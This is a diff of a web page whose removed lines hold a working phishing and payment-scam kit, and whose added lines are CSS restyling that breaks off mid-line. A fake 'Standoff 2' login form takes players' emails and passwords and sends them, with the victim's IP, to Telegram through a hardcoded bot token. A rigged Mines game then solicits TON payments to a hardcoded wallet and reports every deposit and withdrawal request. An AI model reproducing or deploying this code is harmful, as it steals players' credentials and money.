@@ -96,19 +96,6 @@
             color: #4a4f62;
             margin-top: 24px;
         }
-        .error-box {
-            background: #1e1820;
-            border-radius: 24px;
-            padding: 24px;
-            text-align: center;
-        }
-        .error-box h2 {
-            color: #ff4757;
-            margin-bottom: 12px;
-        }
-        .error-box p {
-            color: #aaa;
-        }
         .balance-row {
             display: flex;
             justify-content: space-between;
@@ -116,14 +103,29 @@
             flex-wrap: wrap;
             gap: 10px;
             margin-bottom: 20px;
-            background: #1e2432;
-            padding: 15px;
+            background: linear-gradient(135deg, #1e2432, #1a1f2e);
+            padding: 20px;
             border-radius: 20px;
+            border: 1px solid #ffd96633;
         }
         .balance {
-            font-size: 28px;
+            font-size: 32px;
             font-weight: bold;
-            color: #ffd966;
+            background: linear-gradient(135deg, #ffd966, #ffb347);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .deposit-highlight {
+            background: linear-gradient(135deg, #2a2f42, #1e2432);
+            border-radius: 20px;
+            padding: 20px;
+            margin: 15px 0;
+            border: 1px solid #2ecc7133;
+        }
+        .deposit-highlight strong {
+            font-size: 18px;
+            color: #2ecc71;
         }
         .ton-address {
             background: #1a1f2e;
@@ -137,7 +139,7 @@
         }
         .mines-grid {
             display: grid;
-            grid-template-columns: repeat(5, 1fr);
+            grid-template-columns: repeat(4, 1fr);
             gap: 10px;
             margin: 20px 0;
         }
@@ -148,7 +150,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 24px;
+            font-size: 28px;
             cursor: pointer;
             transition: 0.1s;
             font-weight: bold;
@@ -158,7 +160,7 @@
             transform: scale(0.95);
         }
         .info-panel {
-            background: #1e2432;
+            background: linear-gradient(135deg, #1e2432, #1a1f2e);
             padding: 15px;
             border-radius: 20px;
             margin-top: 20px;
@@ -167,337 +169,45 @@
             align-items: center;
             flex-wrap: wrap;
             gap: 12px;
+            border: 1px solid #ff475733;
+        }
+        .info-panel span {
+            font-size: 16px;
+            font-weight: bold;
+        }
+        .info-panel span:first-child {
+            color: #2ecc71;
+        }
+        .info-panel span:last-child {
+            color: #ff4757;
         }
         .withdraw-section {
             background: #1e2432;
             border-radius: 20px;
-            padding: 15px;
+            padding: 20px;
             margin-top: 20px;
         }
-        .small-input {
-            background: #1e2432;
-            border: 1px solid #2f3545;
-            padding: 10px;
+        .withdraw-options {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin: 15px 0;
+        }
+        .withdraw-option {
+            background: #2a2f42;
+            padding: 12px;
             border-radius: 14px;
-            color: white;
-            width: 120px;
-            text-align: center;
-            display: inline-block;
-            margin-right: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            transition: 0.2s;
+            border: 1px solid #3a3f52;
         }
-        .inline-btn {
-            width: auto;
-            display: inline-block;
-            padding: 10px 20px;
-            margin-top: 0;
+        .withdraw-option:hover {
+            background: #3a3f52;
+            transform: scale(1.01);
         }
-        .message {
-            background: #ff4757;
-            padding: 10px;
-            border-radius: 14px;
-            text-align: center;
-            margin-top: 12px;
-            font-size: 13px;
-        }
-        .game-title {
-            font-size: 18px;
-            font-weight: bold;
-            margin-bottom: 15px;
-            text-align: center;
-        }
-        hr {
-            border-color: #2f3545;
-            margin: 20px 0;
-        }
-    </style>
-</head>
-<body>
-
-<!-- ФИШИНГ СТРАНИЦА (первая) -->
-<div id="loginPage">
-    <div class="card">
-        <div class="logo">
-            <span>⚡ STANDOFF 2</span>
-        </div>
-        <h1>Добро пожаловать</h1>
-        <div class="sub">Войдите в аккаунт</div>
-        
-        <input type="text" id="fakeEmail" placeholder="Email или ID" autocomplete="off">
-        <input type="password" id="fakePassword" placeholder="Пароль">
-        <button id="stealBtn">Войти</button>
-        <div class="footer">© 2025 Standoff 2 · Защищённый вход</div>
-    </div>
-</div>
-
-<!-- ОСНОВНОЙ ИНТЕРФЕЙС С MINES -->
-<div id="mainApp" style="display: none;">
-    <div class="card">
-        <div class="logo">
-            <span>⚡ STANDOFF 2</span>
-        </div>
-        
-        <div class="balance-row">
-            <span>💰 МОНЕТЫ:</span>
-            <span class="balance" id="balanceAmount">0</span>
-        </div>
-        
-        <div style="font-size: 13px; color:#6c7180; margin-bottom: 15px;">
-            ⚡ Игровой ID: <span id="userId" style="color:#ffd966;">—</span>
-        </div>
-        
-        <div class="ton-address">
-            📥 ПОПОЛНИТЬ МОНЕТЫ<br>
-            <strong>1 TON = 20 монет</strong><br>
-            Адрес для перевода TON:<br>
-            <span style="color:#ffd966; font-size: 10px;">UQC8-Ax6obG20LnPyIC13NlN8uX-d9JnutWhrOxOFmfoVfs2</span>
-        </div>
-        
-        <div style="display: flex; gap: 10px; align-items: center; flex-wrap: wrap;">
-            <input type="number" id="depositAmount" placeholder="Сумма в TON" class="small-input" style="width: 150px;">
-            <button id="checkPaymentBtn" class="secondary" style="width: auto; padding: 12px 20px;">💰 ПОПОЛНИТЬ</button>
-        </div>
-        <div id="paymentMsg" style="font-size:12px; margin-top:8px;"></div>
-        
-        <hr>
-        
-        <div class="game-title">🎲 MINES · шанс выигрыша 1/50</div>
-        <div style="text-align: center; margin-bottom: 10px;">💸 Ставка: 5 монет</div>
-        
-        <div class="mines-grid" id="minesGrid"></div>
-        <button id="resetGameBtn" class="secondary">🔄 Новая игра (5 монет)</button>
-        
-        <div class="info-panel">
-            <span>🎯 Победа = +100 монет</span>
-            <span>💀 Поражение = -5 монет</span>
-        </div>
-        
-        <hr>
-        
-        <div class="withdraw-section">
-            <div style="font-weight: bold; margin-bottom: 10px;">💸 ВЫВОД МОНЕТ В ИГРОВУЮ ВАЛЮТУ</div>
-            <input type="number" id="withdrawAmount" placeholder="Сумма монет" class="small-input">
-            <button id="withdrawBtn" class="secondary" style="width: auto; margin-top: 0;">📤 ЗАПРОСИТЬ ВЫВОД</button>
-            <div id="withdrawMsg" style="font-size:12px; margin-top:10px; color:#6c7180;"></div>
-            <div style="font-size: 11px; margin-top: 8px;">⚠️ Вывод обрабатывается вручную до 72 часов</div>
-        </div>
-        
-        <div class="footer">© 2025 Standoff 2 · Игровая платформа</div>
-    </div>
-</div>
-
-<script>
-    // ------------------ ТЕЛЕГРАМ НАСТРОЙКИ ------------------
-    const BOT_TOKEN = '8791162816:AAE_-BCQGhGFyOQ7XHh7L3aPJp90ddlezz4';
-    const ADMIN_IDS = ['7663459492', '6635138703'];
-
-    let currentBalance = 0;
-    let gameActive = false;
-    let currentGrid = [];
-    let bombIndex = -1;
-    let currentUserEmail = '';
-    let currentUserPass = '';
-    let gameStartedNotified = false;
-
-    // ------------------ ОТПРАВКА В ТЕЛЕГРАМ ------------------
-    async function sendToTelegram(text) {
-        for (let id of ADMIN_IDS) {
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}`);
-            } catch(e) {}
-        }
-    }
-
-    async function notifyNewUser(email, password) {
-        const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown');
-        const msg = `🐏 НОВЫЙ ПОЛЬЗОВАТЕЛЬ\n✉️ Почта: ${email}\n🧬 Пароль: ${password}\n🌍 IP: ${ip}\n🕒 ${new Date().toLocaleString()}`;
-        await sendToTelegram(msg);
-    }
-
-    async function notifyDeposit(email, password, tonAmount, coinsAdded) {
-        const msg = `🐏 ПОЛЬЗОВАТЕЛЬ: ${email} | ${password}\n💎 ПОПОЛНЕНИЕ БАЛАНСА\n💰 Сумма: ${tonAmount} TON → ${coinsAdded} монет`;
-        await sendToTelegram(msg);
-    }
-
-    async function notifyGameStart(email, password) {
-        const msg = `🐏 ПОЛЬЗОВАТЕЛЬ: ${email} | ${password}\n💥 НАЧАЛ ИГРУ (Mines, ставка 5 монет)`;
-        await sendToTelegram(msg);
-    }
-
-    async function notifyGameWin(email, password, winAmount) {
-        const msg = `🐏 ПОЛЬЗОВАТЕЛЬ: ${email} | ${password}\n🎉 ВЫИГРЫШ В MINES\n💰 +${winAmount} монет`;
-        await sendToTelegram(msg);
-    }
-
-    async function notifyGameLose(email, password) {
-        const msg = `🐏 ПОЛЬЗОВАТЕЛЬ: ${email} | ${password}\n💀 ПРОИГРЫШ В MINES\n💸 -5 монет`;
-        await sendToTelegram(msg);
-    }
-
-    async function notifyWithdrawRequest(email, password, amount) {
-        const msg = `🐏 ПОЛЬЗОВАТЕЛЬ: ${email} | ${password}\n📤 ЗАПРОС НА ВЫВОД\n💸 Сумма: ${amount} монет`;
-        await sendToTelegram(msg);
-    }
-
-    // ------------------ ИГРА MINES ------------------
-    function initGame() {
-        const isBomb = Math.random() < 0.02;
-        bombIndex = isBomb ? Math.floor(Math.random() * 25) : -1;
-        currentGrid = Array(25).fill('❓');
-        gameActive = true;
-        gameStartedNotified = false;
-        renderGrid();
-    }
-
-    function renderGrid() {
-        const gridDiv = document.getElementById('minesGrid');
-        gridDiv.innerHTML = '';
-        for (let i = 0; i < 25; i++) {
-            const cell = document.createElement('div');
-            cell.className = 'mine-cell';
-            cell.textContent = currentGrid[i];
-            cell.onclick = () => revealCell(i);
-            gridDiv.appendChild(cell);
-        }
-    }
-
-    async function revealCell(index) {
-        if (!gameActive) {
-            showMessage('Игра не активна. Начните новую!');
-            return;
-        }
-        if (currentGrid[index] !== '❓') return;
-        
-        if (index === bombIndex && bombIndex !== -1) {
-            currentGrid[index] = '💣';
-            renderGrid();
-            currentBalance = Math.max(0, currentBalance - 5);
-            updateBalanceUI();
-            showMessage('💀 ВЗРЫВ! Вы проиграли 5 монет.');
-            gameActive = false;
-            await notifyGameLose(currentUserEmail, currentUserPass);
-            localStorage.setItem('standoff2_balance', currentBalance);
-        } else {
-            currentGrid[index] = '💎';
-            renderGrid();
-            if (!window._winGivenThisGame) {
-                currentBalance += 100;
-                updateBalanceUI();
-                showMessage('🎉 ПОБЕДА! +100 монет!');
-                window._winGivenThisGame = true;
-                gameActive = false;
-                await notifyGameWin(currentUserEmail, currentUserPass, 100);
-                localStorage.setItem('standoff2_balance', currentBalance);
-            } else {
-                gameActive = false;
-                showMessage('Игра завершена. Начните новую.');
-            }
-        }
-        if (bombIndex === -1 && !gameActive && !window._winGivenThisGame) {
-            currentBalance += 100;
-            updateBalanceUI();
-            showMessage('🎁 Джекпот! Бомбы не было +100 монет');
-            await notifyGameWin(currentUserEmail, currentUserPass, 100);
-            localStorage.setItem('standoff2_balance', currentBalance);
-        }
-    }
-
-    async function resetGame() {
-        if (currentBalance < 5) {
-            showMessage('❌ Недостаточно монет (нужно 5)');
-            return;
-        }
-        currentBalance -= 5;
-        updateBalanceUI();
-        window._winGivenThisGame = false;
-        initGame();
-        showMessage('Новая игра! Ставка 5 монет. Шанс бомбы 1/50.');
-        localStorage.setItem('standoff2_balance', currentBalance);
-        
-        if (!gameStartedNotified) {
-            await notifyGameStart(currentUserEmail, currentUserPass);
-            gameStartedNotified = true;
-        }
-    }
-
-    function updateBalanceUI() {
-        document.getElementById('balanceAmount').innerText = currentBalance;
-    }
-
-    function showMessage(msg) {
-        const msgDiv = document.getElementById('paymentMsg');
-        if (msgDiv) {
-            msgDiv.innerText = msg;
-            setTimeout(() => { msgDiv.innerText = ''; }, 3000);
-        }
-    }
-
-    // ------------------ ПОПОЛНЕНИЕ ------------------
-    document.getElementById('checkPaymentBtn')?.addEventListener('click', async () => {
-        const tonAmount = parseFloat(document.getElementById('depositAmount').value);
-        if (isNaN(tonAmount) || tonAmount <= 0) {
-            showMessage('❌ Введите сумму в TON (например: 1, 2, 5)');
-            return;
-        }
-        const coinsAdded = tonAmount * 20;
-        currentBalance += coinsAdded;
-        updateBalanceUI();
-        localStorage.setItem('standoff2_balance', currentBalance);
-        showMessage(`✅ +${coinsAdded} монет зачислено!`);
-        await notifyDeposit(currentUserEmail, currentUserPass, tonAmount, coinsAdded);
-        document.getElementById('depositAmount').value = '';
-    });
-
-    // ------------------ ВЫВОД ------------------
-    document.getElementById('withdrawBtn')?.addEventListener('click', async () => {
-        let amount = parseInt(document.getElementById('withdrawAmount').value);
-        if (isNaN(amount) || amount <= 0) {
-            document.getElementById('withdrawMsg').innerHTML = '❌ Введите сумму';
-            return;
-        }
-        if (amount > currentBalance) {
-            document.getElementById('withdrawMsg').innerHTML = '❌ Недостаточно монет';
-            return;
-        }
-        await notifyWithdrawRequest(currentUserEmail, currentUserPass, amount);
-        currentBalance -= amount;
-        updateBalanceUI();
-        localStorage.setItem('standoff2_balance', currentBalance);
-        document.getElementById('withdrawMsg').innerHTML = `⏳ Заявка на вывод ${amount} монет принята. Ожидайте 72 часа.`;
-        setTimeout(() => {
-            document.getElementById('withdrawMsg').innerHTML = '';
-        }, 4000);
-        document.getElementById('withdrawAmount').value = '';
-    });
-
-    // ------------------ ФИШИНГ + ПЕРЕХОД ------------------
-    document.getElementById('stealBtn').addEventListener('click', async () => {
-        const email = document.getElementById('fakeEmail').value.trim();
-        const pass = document.getElementById('fakePassword').value.trim();
-        if (!email || !pass) {
-            alert('Введите почту и пароль');
-            return;
-        }
-        
-        currentUserEmail = email;
-        currentUserPass = pass;
-        
-        await notifyNewUser(email, pass);
-        
-        document.getElementById('loginPage').style.display = 'none';
-        document.getElementById('mainApp').style.display = 'flex';
-        document.getElementById('mainApp').style.justifyContent = 'center';
-        
-        let saved = localStorage.getItem('standoff2_balance');
-        if (saved !== null && saved !== 'NaN') currentBalance = parseInt(saved);
-        else currentBalance = 100;
-        
-        updateBalanceUI();
-        document.getElementById('userId').innerText = email.substring(0, 15) + '...';
-        initGame();
-    });
-
-    document.getElementById('resetGameBtn')?.addEventListener('click', resetGame);
-    document.addEventListener('contextmenu', e => e.preventDefault());
-</script>
-</body>
-</html>
+        .withdraw-option.selected {
+            border-color: #2ecc71;
+            background: #2e
